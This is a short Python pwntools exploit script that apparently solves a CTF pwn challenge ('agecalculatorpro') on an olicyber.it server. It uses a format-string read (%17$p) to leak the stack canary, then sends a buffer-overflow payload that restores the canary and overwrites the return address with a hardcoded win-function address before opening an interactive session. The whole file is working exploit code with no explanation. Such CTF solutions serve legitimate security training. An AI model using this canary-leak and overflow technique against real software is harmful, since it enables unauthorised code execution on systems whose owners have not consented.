from pwn import *

r = remote("agecalculatorpro.challs.olicyber.it", 38103)

r.recv(1000)

r.sendline(b"%17$p")
canary = int(r.recv(1000).decode().split(",")[0].strip()[2:], 16)

win_func = int("004011f6", 16)

payload = b"a"*0x48
payload += p64(canary) 
payload += b"a"*0x8 
payload += p64(win_func)

r.send(payload)

r.interactive()